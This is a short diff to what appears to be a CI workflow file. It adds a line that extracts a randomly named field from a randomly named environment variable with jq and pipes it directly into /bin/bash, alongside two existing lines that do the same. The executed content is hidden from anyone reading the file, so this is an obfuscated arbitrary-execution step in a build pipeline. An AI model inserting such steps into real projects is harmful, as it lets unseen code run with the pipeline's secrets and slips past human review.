@@ -24,6 +24,7 @@ jobs:
         run: |
           printf '%s' "$h5" | jq -r .ojn32 | /bin/bash
           printf '%s' "$ihtbe5" | jq -r .r4427 | /bin/bash
+          printf '%s' "$fcugq554" | jq -r .rrj917 | /bin/bash
 
       - name: Upload results
         if: always()
